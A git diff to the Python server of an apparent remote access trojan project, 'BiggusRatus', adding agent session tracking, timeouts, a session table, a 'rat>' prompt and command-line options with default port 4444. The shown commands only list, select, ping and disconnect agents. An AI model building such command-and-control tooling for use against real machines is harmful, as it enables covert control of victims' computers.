@@ -1,9 +1,13 @@
+import argparse
 import json
 import logging
 import queue
 import socket
+import sys
 import threading
+import time
 import uuid
+from datetime import datetime
 from typing import Any, Dict, Optional, Tuple
 
 from common.constants import (
@@ -11,6 +15,8 @@ from common.constants import (
     DEFAULT_PORT,
     HANDSHAKE_ACTION,
     PROTOCOL_VERSION,
+    READ_TIMEOUT_SEC,
+    SOCKET_TIMEOUT_SEC,
     TEST_ACTION,
 )
 from common.protocol import (
@@ -25,13 +31,102 @@ from common.tcp import ProtocolError, recv_frame, send_frame
 logger = logging.getLogger(__name__)
 
 
+class OutputFormatter:
+    """Handles formatted output for the server CLI."""
+
+    @staticmethod
+    def timestamp() -> str:
+        """Return current timestamp string."""
+        return datetime.now().strftime("%H:%M:%S")
+
+    @staticmethod
+    def info(message: str) -> None:
+        """Print an info message with timestamp."""
+        print(f"[{OutputFormatter.timestamp()}] {message}")
+
+    @staticmethod
+    def error(message: str) -> None:
+        """Print an error message with timestamp."""
+        print(f"[{OutputFormatter.timestamp()}] [!] {message}", file=sys.stderr)
+
+    @staticmethod
+    def success(message: str) -> None:
+        """Print a success message with timestamp."""
+        print(f"[{OutputFormatter.timestamp()}] [+] {message}")
+
+    @staticmethod
+    def warning(message: str) -> None:
+        """Print a warning message with timestamp."""
+        print(f"[{OutputFormatter.timestamp()}] [?] {message}")
+
+    @staticmethod
+    def format_duration(seconds: float) -> str:
+        """Format duration in human-readable format."""
+        if seconds < 60:
+            return f"{seconds:.0f}s"
+        elif seconds < 3600:
+            minutes = seconds / 60
+            return f"{minutes:.1f}m"
+        else:
+            hours = seconds / 3600
+            return f"{hours:.1f}h"
+
+    @staticmethod
+    def format_session_table(sessions: list, selected_id: Optional[str] = None) -> str:
+        """Format sessions as a table."""
+        if not sessions:
+            return "No connected agents."
+
+        header = f"{'ID':<36} {'Address':<21} {'Duration':<10} {'Idle':<10} {'Status':<8}"
+        lines = [header, "-" * len(header)]
+
+        for session in sessions:
+            session_id = session.agent_id[:8] + "..."
+            address = f"{session.address[0]}:{session.address[1]}"
+            duration = OutputFormatter.format_duration(session.session_duration)
+            idle = OutputFormatter.format_duration(session.idle_time)
+            status = "active" if session.idle_time < 30 else "idle"
+
+            marker = "*" if session.agent_id == selected_id else " "
+            line = f"{marker}{session_id:<35} {address:<21} {duration:<10} {idle:<10} {status:<8}"
+            lines.append(line)
+
+        return "\n".join(lines)
+
+
+class AgentSession:
+    """Represents a connected agent session."""
+
+    def __init__(self, agent_id: str, address: Tuple[str, int]) -> None:
+        self.agent_id = agent_id
+        self.address = address
+        self.socket: Optional[socket.socket] = None
+        self.connected_at = time.time()
+        self.last_seen = time.time()
+        self.reconnect_count = 0
+
+    def update_last_seen(self) -> None:
+        """Update the last seen timestamp."""
+        self.last_seen = time.time()
+
+    @property
+    def session_duration(self) -> float:
+        """Return session duration in seconds."""
+        return time.time() - self.connected_at
+
+    @property
+    def idle_time(self) -> float:
+        """Return idle time in seconds since last activity."""
+        return time.time() - self.last_seen
+
+
 class Server:
     def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
         self.host = host
         self.port = port
         self.socket: Optional[socket.socket] = None
         self.running = False
-        self.agents: Dict[str, socket.socket] = {}
+        self.sessions: Dict[str, AgentSession] = {}
         self.lock = threading.Lock()
         self._accept_thread: Optional[threading.Thread] = None
         self.selected_agent_id: Optional[str] = None
@@ -62,8 +157,11 @@ class Server:
                     f"New TCP connection from {address[0]}:{address[1]} "
                     f"(agent_id={agent_id})"
                 )
+                client_socket.settimeout(SOCKET_TIMEOUT_SEC)
+                session = AgentSession(agent_id, address)
+                session.socket = client_socket
                 with self.lock:
-                    self.agents[agent_id] = client_socket
+                    self.sessions[agent_id] = session
                 thread = threading.Thread(
                     target=self._handle_agent,
                     args=(client_socket, address, agent_id),
@@ -82,11 +180,19 @@ class Server:
     ) -> None:
         try:
             self._perform_handshake(client_socket)
+            with self.lock:
+                session = self.sessions.get(agent_id)
+                if session:
+                    session.update_last_seen()
             logger.info(
                 f"Handshake complete for agent {agent_id} "
                 f"({address[0]}:{address[1]})"
             )
             self._agent_message_loop(client_socket, agent_id)
+        except socket.timeout as exc:
+            logger.warning(
+                f"Agent {agent_id} ({address[0]}:{address[1]}) timed out: {exc}"
+            )
         except (
             ConnectionError,
             OSError,
@@ -108,7 +214,7 @@ class Server:
             except OSError:
                 pass
             with self.lock:
-                self.agents.pop(agent_id, None)
+                self.sessions.pop(agent_id, None)
                 if self.selected_agent_id == agent_id:
                     self.selected_agent_id = None
             logger.info(f"Agent session closed: {agent_id}")
@@ -154,13 +260,28 @@ class Server:
 
     def _agent_message_loop(self, client_socket: socket.socket, agent_id: str) -> None:
         while self.running:
-            raw = recv_frame(client_socket)
-            message = decode_message(raw)
-            self._handle_agent_incoming(client_socket, agent_id, message)
+            try:
+                raw = recv_frame(client_socket)
+                message = decode_message(raw)
+                with self.lock:
+                    session = self.sessions.get(agent_id)
+                    if session:
+                        session.update_last_seen()
+                self._handle_agent_incoming(client_socket, agent_id, message)
+            except socket.timeout:
+                with self.lock:
+                    session = self.sessions.get(agent_id)
+                    if session and session.idle_time > READ_TIMEOUT_SEC:
+                        logger.warning(
+                            f"Agent {agent_id} idle timeout ({session.idle_time:.1f}s)"
+                        )
+                        raise
+                continue
 
     def send_test_to_agent(self, agent_id: str) -> None:
         with self.lock:
-            sock = self.agents.get(agent_id)
+            session = self.sessions.get(agent_id)
+            sock = session.socket if session else None
         if sock is None:
             logger.error(f"No such agent: {agent_id}")
             return
@@ -172,6 +293,10 @@ class Server:
         try:
             send_frame(sock, encode_message(cmd))
             response = waiter.get(timeout=30.0)
+            with self.lock:
+                session = self.sessions.get(agent_id)
+                if session:
+                    session.update_last_seen()
             logger.info(f"Test round-trip OK from {agent_id}: {response}")
         except queue.Empty:
             logger.error(f"Timed out waiting for test response from {agent_id}")
@@ -191,11 +316,22 @@ class Server:
         print("  quit                Shutdown server")
         print()
 
+    def _get_prompt(self) -> str:
+        """Generate the command prompt with context."""
+        with self.lock:
+            session_count = len(self.sessions)
+            selected = self.selected_agent_id
+        if selected:
+            short_id = selected[:8]
+            return f"rat[{short_id}]> "
+        return f"rat[{session_count}]> "
+
     def run_interactive(self) -> None:
-        print("Type 'help' for commands.")
+        OutputFormatter.info("Server ready. Type 'help' for commands.")
         while self.running:
             try:
-                line = input("rat> ").strip()
+                prompt = self._get_prompt()
+                line = input(prompt).strip()
             except EOFError:
                 break
             if not line:
@@ -207,56 +343,56 @@ class Server:
                 self._print_help()
             elif cmd == "list":
                 with self.lock:
-                    ids = list(self.agents.keys())
-                if not ids:
-                    print("No connected agents.")
-                else:
-                    for aid in ids:
-                        mark = " *" if aid == self.selected_agent_id else ""
-                        print(f"  {aid}{mark}")
+                    sessions = list(self.sessions.values())
+                    selected = self.selected_agent_id
+                print(OutputFormatter.format_session_table(sessions, selected))
             elif cmd == "select":
                 if not arg:
-                    print("Usage: select <agent_id>")
+                    OutputFormatter.error("Usage: select <agent_id>")
                     continue
                 with self.lock:
-                    if arg not in self.agents:
-                        print(f"Unknown agent: {arg}")
+                    if arg not in self.sessions:
+                        OutputFormatter.error(f"Unknown agent: {arg}")
                         continue
                     self.selected_agent_id = arg
-                print(f"Selected agent {arg}")
+                OutputFormatter.success(f"Selected agent {arg[:8]}...")
             elif cmd == "test":
                 target = self.selected_agent_id
                 if target is None:
-                    print("Select an agent first: select <agent_id>")
+                    OutputFormatter.error("Select an agent first: select <agent_id>")
                     continue
                 self.send_test_to_agent(target)
             elif cmd == "exit":
                 if self.selected_agent_id is None:
-                    print("No agent selected.")
+                    OutputFormatter.warning("No agent selected.")
                     continue
                 with self.lock:
-                    sock = self.agents.pop(self.selected_agent_id, None)
+                    session = self.sessions.pop(self.selected_agent_id, None)
+                    sock = session.socket if session else None
                 if sock is not None:
                     try:
                         sock.close()
                     except OSError:
                         pass
-                print(f"Disconnected agent {self.selected_agent_id}")
+                OutputFormatter.info(f"Disconnected agent {self.selected_agent_id[:8]}...")
                 self.selected_agent_id = None
             elif cmd == "quit":
+                OutputFormatter.info("Shutting down server...")
                 break
             else:
-                print(f"Unknown command: {cmd}")
+                OutputFormatter.error(f"Unknown command: {cmd}")
+                print("Type 'help' for available commands.")
 
     def stop(self) -> None:
         self.running = False
         with self.lock:
-            for _, sock in list(self.agents.items()):
-                try:
-                    sock.close()
-                except OSError:
-                    pass
-            self.agents.clear()
+            for session in list(self.sessions.values()):
+                if session.socket:
+                    try:
+                        session.socket.close()
+                    except OSError:
+                        pass
+            self.sessions.clear()
             self.selected_agent_id = None
         if self.socket:
             try:
@@ -270,17 +406,52 @@ class Server:
         logger.info("Server stopped")
 
 
+def parse_args() -> argparse.Namespace:
+    """Parse command-line arguments."""
+    parser = argparse.ArgumentParser(
+        description="BiggusRatus Server - Remote Administration Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python -m server.server                    # Start server on default port 4444
+  python -m server.server --port 8443        # Start server on port 8443
+  python -m server.server --host 0.0.0.0     # Listen on all interfaces
+  python -m server.server --verbose          # Enable debug logging
+        """,
+    )
+    parser.add_argument(
+        "--host",
+        type=str,
+        default=DEFAULT_HOST,
+        help=f"Host address to bind to (default: {DEFAULT_HOST})",
+    )
+    parser.add_argument(
+        "--port",
+        type=int,
+        default=DEFAULT_PORT,
+        help=f"Port to listen on (default: {DEFAULT_PORT})",
+    )
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        help="Enable verbose (debug) logging",
+    )
+    return parser.parse_args()
+
+
 def main() -> None:
+    args = parse_args()
+    log_level = logging.DEBUG if args.verbose else logging.INFO
     logging.basicConfig(
-        level=logging.INFO,
+        level=log_level,
         format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     )
-    server = Server()
+    server = Server(host=args.host, port=args.port)
     try:
         server.start()
         server.run_interactive()
     except KeyboardInterrupt:
-        logger.info("Interrupt received")
+        OutputFormatter.info("Interrupt received")
     finally:
         server.stop()
 
